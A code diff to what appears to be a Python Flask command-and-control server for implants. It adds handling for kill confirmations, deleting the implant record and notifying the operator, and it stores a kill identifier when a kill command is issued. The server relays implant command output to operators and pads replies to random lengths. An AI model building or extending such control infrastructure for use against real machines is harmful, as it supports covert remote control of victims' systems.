@@ -178,18 +178,27 @@ def implant_response():
     commandlog_db.dict[ID].command.output = data[1]
     commandlog_db.dict[ID].response_timestamp = datetime.now()
 
-    # Build a json-able dict to send back to the operator
-    r = { "command": commandlog_db.dict[ID].command.__dict__,
-          "sent_timestamp": str(commandlog_db.dict[ID].sent_timestamp),
-          "response_timestamp": str(commandlog_db.dict[ID].response_timestamp)
-        }
+    ret = make_response(encryption.id_generator(random.randint(200,350)))
 
-    # Send the response back to the operator
+    # Send the response back to the operator, either a kill confirm or output
     op = commandlog_db.dict[ID].operator
-    data = {"update_type": "NEW_COMMAND_RESPONSE", "update_data": r}
+    # If the update is an exit
+    if data[1][:4] == "KILL":
+        if data[1] == implant_db.dict[implant_name].kill_id:
+            del implant_db.dict[implant_name]
+            data = {"update_type": server_codes.ServerUpdates.IMPLANT_DELETED.value , "update_data": implant_name} 
+            resp = requests.post("http://"+op.IP+":"+op.port+"/update", json=data)
+            return ret
+
+    # If not a kill command response, build a json-able dict to send back to the operator
+    r = { "command": commandlog_db.dict[ID].command.__dict__,
+         "sent_timestamp": str(commandlog_db.dict[ID].sent_timestamp),
+         "response_timestamp": str(commandlog_db.dict[ID].response_timestamp)
+         }
+
+    data = {"update_type": server_codes.ServerUpdates.NEW_COMMAND_RESPONSE.value , "update_data": r}
     resp = requests.post("http://"+op.IP+":"+op.port+"/update", json=data)
     
-    ret = make_response(encryption.id_generator(random.randint(200,350)))
     return ret
 
 # Operator connects to this endpoint to login
@@ -256,6 +265,10 @@ def str_command():
     # Get the command string and decode from bytes
     cmd_str = request.form['cmd_str']
     print(cmd_str)
+
+    # If the command is of type KILL_IMPLANT, then add the kill_id to the implant
+    if cmd_type == storage.CMD_TYPE.CMD_KILL.value:
+        implant_db.dict[imp_name].kill_id = cmd_str.split(":::")[2]
 
     # If there is a command involving a file
     # if not, just save the command string and log it in the commandlog_db
